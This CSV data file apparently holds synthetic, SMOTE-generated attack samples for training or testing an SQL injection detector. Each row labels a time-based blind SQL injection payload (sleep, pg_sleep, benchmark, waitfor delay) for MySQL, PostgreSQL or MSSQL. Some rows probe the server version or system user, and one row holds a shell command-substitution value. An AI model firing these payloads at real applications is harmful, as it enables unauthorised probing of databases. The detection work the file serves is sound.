id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000071,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,0.7693254598005144
SMOTE_000072,attack,time,"1""   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000056,0.2719977755647369
SMOTE_000073,attack,time,1'  )   as jztg where 1222  =  1222 or sleep  (  5  )  #,nearest_attack_euclidean,R000571,0.7357765416967906
SMOTE_000074,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000065,0.6914104736107641
SMOTE_000075,attack,time,"1%""   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000158,0.2222793226845676
SMOTE_000076,attack,time,1 or sleep  (  5  ) ,nearest_attack_euclidean,R000484,1.2973892224775125
SMOTE_000077,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,0.06973800305757194
SMOTE_000078,attack,time,"1""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   ""dyoe""  =  ""dyoe",nearest_attack_euclidean,R000176,0.1252470001878553
SMOTE_000079,attack,time,1'   )    )    as hxxm where 3792  =  3792 and sleep  (  5  )  #,nearest_attack_euclidean,R000418,0.7372019548614868
SMOTE_000080,attack,time,1'+  (  select 'stsu' where 2386  =  2386 or sleep  (  5  )  #,nearest_attack_euclidean,R000558,0.9802679138301824
SMOTE_000081,attack,time,"1 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000576,0.2704345118992074
SMOTE_000082,attack,time,1'   )    )     )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000236,0.0786571441032934
SMOTE_000083,attack,time,1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,nearest_attack_euclidean,R000489,0.3709800615942082
SMOTE_000084,attack,time,"1""   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   ""fbol"" like ""fbol",nearest_attack_euclidean,R000616,0.5172488869655787
SMOTE_000085,attack,time,1%'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R000317,1.4400329814826727
SMOTE_000086,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000249,0.8174911604750617
SMOTE_000087,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  ""cadh"" like ""cadh",nearest_attack_euclidean,R000584,0.7387956706430985
SMOTE_000088,attack,time,1' where 9708  =  9708 or sleep  (  5  )  --,nearest_attack_euclidean,R000665,1.0809399592244902
SMOTE_000089,attack,time,"1""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  ""sdps""  =  ""sdps",nearest_attack_euclidean,R000400,0.5162451349249816
SMOTE_000090,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.9063844965984087
SMOTE_000091,attack,time,1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000405,0.8428235098719516
SMOTE_000092,attack,time,"1 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   # irvm",nearest_attack_euclidean,R000496,0.4215736638388653
SMOTE_000093,attack,time,"select pg_sleep  (  5  )   and ""%""  =  """,nearest_attack_euclidean,R000347,1.2448429315464538
SMOTE_000094,attack,time,waitfor delay '0:0:5'# ogzq,nearest_attack_euclidean,R000595,1.0105568980552622
SMOTE_000095,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000632,0.4241748889751518
SMOTE_000096,attack,time,1   )    )    rlike sleep  (  5  )   and    (    (   8773  =  8773,nearest_attack_euclidean,R000308,0.13345435605569325
SMOTE_000097,attack,time,"select pg_sleep  (  5  )   and    (    (     (  ""nvuv"" like ""nvuv",nearest_attack_euclidean,R000246,0.7717286909222951
SMOTE_000098,attack,time," or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000039,0.7505011589232469
SMOTE_000099,attack,time,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000728,1.0198864148295708
SMOTE_000100,attack,time,1'+  (  select echl where 6593  =  6593 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000169,0.7194381923071507
SMOTE_000101,attack,time,1  )   where 1203  =  1203 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000555,1.1819874241466135
SMOTE_000102,attack,time,select pg_sleep  (  5  )   and    (    (   4382  =  4382,nearest_attack_euclidean,R000419,0.6199793712163341
SMOTE_000103,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,0.8335172032691317
SMOTE_000104,attack,time,1'  )   where 4364  =  4364 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000492,0.09612215991216909
SMOTE_000105,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'dvpw'  =  'dvpw",nearest_attack_euclidean,R000767,0.8433548321787006
SMOTE_000106,attack,time,1'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   'yqbo'  =  'yqbo,nearest_attack_euclidean,R000424,0.7081967234772785
SMOTE_000107,attack,time,1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000189,0.4487797392936047
SMOTE_000108,attack,time,1  )   where 6950  =  6950 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R000585,0.5343728009891248
SMOTE_000109,attack,time,1%'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  '%'  =  ',nearest_attack_euclidean,R000672,0.8332693334676509
SMOTE_000110,attack,time,1'   )    )    as yqcl where 5026  =  5026 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R000228,0.441861970500592
SMOTE_000111,attack,time,"1' or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000711,0.04402399655363883
SMOTE_000112,attack,time,1'+  (  select ejaj where 1651  =  1651 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  +',nearest_attack_euclidean,R000500,0.5614405428423225
SMOTE_000113,attack,time,"1"" where 2547  =  2547 or sleep  (  5  )  #",nearest_attack_euclidean,R000600,1.2669179973383584
SMOTE_000114,attack,time,"select sleep  (  5  )   and   (  ""innk""  =  ""innk",nearest_attack_euclidean,R000219,0.35223213551755767
SMOTE_000115,attack,time,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",nearest_attack_euclidean,R000525,0.25812453178725414
SMOTE_000116,attack,time,"1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R000073,1.7323557389052702
SMOTE_000117,attack,time,1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'hokd'  =  'hokd,nearest_attack_euclidean,R000332,0.03120846700361081
SMOTE_000118,attack,time,1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  'cmqe' like 'cmqe,nearest_attack_euclidean,R000408,0.38155610398790063
SMOTE_000119,attack,time,1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000547,0.90543847515133
SMOTE_000120,attack,time,"1'   )    )    as bedq where 8781  =  8781 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000051,0.23296368572644474
SMOTE_000121,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,6.795939670071238
SMOTE_000122,attack,time,"1 where 8074  =  8074 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000351,0.015186478539642884
SMOTE_000123,attack,time,"1 where 7196  =  7196 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000322,1.0788616553032764
SMOTE_000124,attack,time,select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,nearest_attack_euclidean,R000084,0.6423639337465232
SMOTE_000125,attack,time,select sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000298,0.03177273325630384
SMOTE_000126,attack,time,"1"" where 7739  =  7739 and sleep  (  5  )  --",nearest_attack_euclidean,R000069,0.5442073294174292
SMOTE_000127,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.6127703513003938
SMOTE_000128,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,0.04788786520108331
SMOTE_000129,attack,time,"1'+  (  select 'plcm' where 2141  =  2141 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000509,0.8856422669006422
SMOTE_000130,attack,time,"waitfor delay '0:0:5' and    (    (     (  ""lpeo""  =  ""lpeo",nearest_attack_euclidean,R000457,1.5395856995730348
SMOTE_000131,attack,time,"1 where 1842  =  1842 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000752,0.8161600399885289
SMOTE_000132,attack,time,"1%""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000180,1.0722886337662736
SMOTE_000133,attack,time,"1""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  ""djwo""  =  ""djwo",nearest_attack_euclidean,R000250,0.24212858320885003
SMOTE_000134,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and ""vzft""  =  ""vzft",nearest_attack_euclidean,R000215,1.3710951433255083
SMOTE_000135,attack,time,"select pg_sleep  (  5  )   and   (  ""pjql"" like ""pjql",nearest_attack_euclidean,R000161,0.08786657023859029
SMOTE_000136,attack,time,"1  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",nearest_attack_euclidean,R000381,0.30722433361642915
SMOTE_000137,attack,time,"select sleep  (  5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000202,0.5696067202071682
SMOTE_000138,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000440,0.44986875834113266
SMOTE_000139,attack,time,waitfor delay '0:0:5' and   (  '%'  =  ',nearest_attack_euclidean,R000684,0.1493162917327008
SMOTE_000140,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and ""vzft""  =  ""vzft",nearest_attack_euclidean,R000215,0.1482127900006569
SMOTE_000141,attack,time,1%'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000574,0.5741833586005947
SMOTE_000142,attack,time,select sleep  (  5  )   and    (    (   'keoy'  =  'keoy,nearest_attack_euclidean,R000175,0.22694579503644366
SMOTE_000143,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000401,0.4890074584844188
SMOTE_000144,attack,time,"1"" where 2309  =  2309 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000252,0.0002166907903809744
SMOTE_000145,attack,time,"1""  )   or sleep  (  5  )   and   (  ""xgtk""  =  ""xgtk",nearest_attack_euclidean,R000591,0.21648695646491078
SMOTE_000146,attack,time,1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and 'gpax'  =  'gpax,nearest_attack_euclidean,R000737,0.10731977235777476
SMOTE_000147,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""kojr""  =  ""kojr",nearest_attack_euclidean,R000210,0.33635379659471104
SMOTE_000148,attack,time,"1""  )   waitfor delay '0:0:5' and   (  ""hhzy"" like ""hhzy",nearest_attack_euclidean,R000091,0.5366112763507968
SMOTE_000149,attack,time,1%' rlike sleep  (  5  )  #,nearest_attack_euclidean,R000254,1.5457121423321576
SMOTE_000150,attack,time,1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000428,0.5015051515248974
SMOTE_000151,attack,time,1 where 6223  =  6223 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000131,0.06692210787107301
SMOTE_000152,attack,time,"1""   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000336,0.0837151171229243
SMOTE_000153,attack,time,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",nearest_attack_euclidean,R000525,0.674744400816889
SMOTE_000154,attack,time,"1  )   as skby where 4269  =  4269 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000397,1.6636054314378612
SMOTE_000155,attack,time,1' where 5455  =  5455 and sleep  (  5  )  --,nearest_attack_euclidean,R000642,0.656117490347656
SMOTE_000156,attack,time,"1"" where 3990  =  3990 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000529,0.156037534102903
SMOTE_000157,attack,time,select sleep  (  5  )   and    (    (   3404  =  3404,nearest_attack_euclidean,R000283,0.3798289804803142
SMOTE_000158,attack,time,1'||  (  select 'xqqp' where 3007  =  3007 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000339,0.5877350305635247
SMOTE_000159,attack,time,1  )   as crsd where 5271  =  5271 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000512,0.34071167939783187
SMOTE_000160,attack,time,"1""  )   as mszg where 6184  =  6184 rlike sleep  (  5  )  --",nearest_attack_euclidean,R000443,0.1505900095475616
SMOTE_000161,attack,time,"1""   )    )    as daqd where 4390  =  4390 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000311,0.7805488380113055
SMOTE_000162,attack,time," select sleep  (  5  )   and    (    (   ""wueo""  =  ""wueo",nearest_attack_euclidean,R000534,0.48390024526559183
SMOTE_000163,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and ""vzft""  =  ""vzft",nearest_attack_euclidean,R000215,0.12073137246357821
SMOTE_000164,attack,time,1  )   where 8320  =  8320 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000234,0.4003316320661538
SMOTE_000165,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  ""gixv""  =  ""gixv",nearest_attack_euclidean,R000680,0.6261967068380937
SMOTE_000166,attack,time,"1%'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000375,0.7813733157611541
SMOTE_000167,attack,time,"1   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  2341  =  2341",nearest_attack_euclidean,R000257,0.24320927321835087
SMOTE_000168,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and ""%""  =  """,nearest_attack_euclidean,R000755,0.16317779651574513
SMOTE_000169,attack,time,1%'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000059,0.09577738624501178
SMOTE_000170,attack,time,"1"" where 1831  =  1831 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000329,0.7519321550297761
SMOTE_000171,attack,time,"1'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  'cjre'  =  'cjre",nearest_attack_euclidean,R000102,0.2883207039710345
SMOTE_000172,attack,time,1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'cqwz' like 'cqwz,nearest_attack_euclidean,R000159,0.6469826960983214
